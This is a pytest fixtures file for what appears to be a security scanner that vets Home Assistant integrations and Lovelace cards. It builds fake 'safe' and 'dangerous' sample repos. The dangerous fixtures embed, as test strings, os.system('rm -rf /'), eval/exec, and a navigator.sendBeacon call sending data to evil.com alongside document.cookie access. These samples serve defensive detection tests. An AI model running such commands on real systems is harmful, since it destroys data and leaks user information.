"""Shared fixtures for ha-sandbox tests."""

import json
import os
import shutil
from pathlib import Path
from unittest.mock import patch

import pytest

# Override settings before any app import
os.environ.setdefault("SANDBOX_REPOS_DIR", "/tmp/ha-sandbox-test/repos")
os.environ.setdefault("SANDBOX_REPORTS_DIR", "/tmp/ha-sandbox-test/reports")


@pytest.fixture(autouse=True)
def _test_dirs(tmp_path):
    """Provide isolated temp dirs for repos/reports and patch settings + storage."""
    repos = tmp_path / "repos"
    reports = tmp_path / "reports"
    repos.mkdir()
    reports.mkdir()

    from app import storage
    db_path = tmp_path / "test.db"

    with patch("app.config.settings.repos_dir", str(repos)), \
         patch("app.config.settings.reports_dir", str(reports)), \
         patch.object(storage, "DB_PATH", db_path):
        storage._conn = None
        storage.init()
        yield {"repos": repos, "reports": reports}
        storage.close()


@pytest.fixture
def fixture_integration(tmp_path):
    """Create a fake HA integration repo structure."""
    repo = tmp_path / "test-integration"
    cc = repo / "custom_components" / "test_domain"
    cc.mkdir(parents=True)

    (cc / "manifest.json").write_text(json.dumps({
        "domain": "test_domain",
        "name": "Test Integration",
        "version": "1.2.3",
        "documentation": "https://example.com",
        "dependencies": ["mqtt"],
        "requirements": ["somelib==1.0"],
        "iot_class": "local_push",
    }))
    (cc / "__init__.py").write_text('"""Test integration."""\n')
    (cc / "sensor.py").write_text(
        'import subprocess\n'
        'def setup(hass):\n'
        '    pass\n'
    )
    return repo


@pytest.fixture
def fixture_card(tmp_path):
    """Create a fake Lovelace card repo structure."""
    repo = tmp_path / "test-card"
    repo.mkdir(parents=True)
    dist = repo / "dist"
    dist.mkdir()

    (repo / "hacs.json").write_text(json.dumps({
        "name": "Test Card",
        "category": "plugin",
    }))
    (dist / "test-card.js").write_text(
        'class TestCard extends HTMLElement {\n'
        '  render() { this.innerHTML = "<div>hello</div>"; }\n'
        '}\n'
    )
    return repo


@pytest.fixture
def fixture_dangerous_py(tmp_path):
    """Create a Python file with dangerous patterns."""
    repo = tmp_path / "dangerous-repo"
    cc = repo / "custom_components" / "evil"
    cc.mkdir(parents=True)

    (cc / "manifest.json").write_text(json.dumps({
        "domain": "evil",
        "name": "Evil Integration",
        "version": "0.1.0",
    }))
    (cc / "__init__.py").write_text(
        'import os\n'
        'import subprocess\n'
        'import pickle\n'
        'import ctypes\n'
        'data = eval("1+1")\n'
        'exec("print(1)")\n'
        'os.system("rm -rf /")\n'
    )
    return repo


@pytest.fixture
def fixture_dangerous_js(tmp_path):
    """Create a JS file with dangerous patterns."""
    repo = tmp_path / "dangerous-card"
    repo.mkdir(parents=True)

    (repo / "hacs.json").write_text(json.dumps({
        "name": "Evil Card",
        "category": "plugin",
    }))
    (repo / "evil-card.js").write_text(
        'eval("alert(1)");\n'
        'document.write("<script>bad</script>");\n'
        'navigator.sendBeacon("https://evil.com", data);\n'
        'new Function("return 1");\n'
        'document.cookie;\n'
        'gtag("send", "pageview");\n'
    )
    return repo


@pytest.fixture
def fixture_safe_py(tmp_path):
    """Create a safe Python integration."""
    repo = tmp_path / "safe-repo"
    cc = repo / "custom_components" / "safe"
    cc.mkdir(parents=True)

    (cc / "manifest.json").write_text(json.dumps({
        "domain": "safe",
        "name": "Safe Integration",
        "version": "1.0.0",
        "iot_class": "local_polling",
    }))
    (cc / "__init__.py").write_text(
        'import logging\n'
        '_LOGGER = logging.getLogger(__name__)\n'
        'async def async_setup(hass, config):\n'
        '    _LOGGER.info("Setup")\n'
        '    return True\n'
    )
    return repo


@pytest.fixture
def fixture_safe_js(tmp_path):
    """Create a safe JS card."""
    repo = tmp_path / "safe-card"
    repo.mkdir(parents=True)

    (repo / "hacs.json").write_text(json.dumps({
        "name": "Safe Card",
        "category": "plugin",
    }))
    (repo / "safe-card.js").write_text(
        'class SafeCard extends HTMLElement {\n'
        '  set hass(hass) { this.textContent = "hello"; }\n'
        '}\n'
        'customElements.define("safe-card", SafeCard);\n'
    )
    return repo
